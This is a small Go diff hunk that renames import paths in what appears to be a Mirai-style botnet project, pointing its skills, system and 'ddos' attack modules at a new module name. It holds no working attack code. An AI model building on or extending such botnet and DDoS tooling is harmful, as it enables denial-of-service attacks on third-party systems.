@@ -7,9 +7,9 @@ import (
 	"strings"
 	"sync"
 	"time"
-	skills "zeroC2/mirai/components/skills"
-	system "zeroC2/mirai/components/system"
-	attack "zeroC2/mirai/ddos"
+	skills "terylene/mirai/components/skills"
+	system "terylene/mirai/components/system"
+	attack "terylene/mirai/ddos"
 
 	zmq "github.com/pebbe/zmq4"
 	"golang.org/x/crypto/ssh"
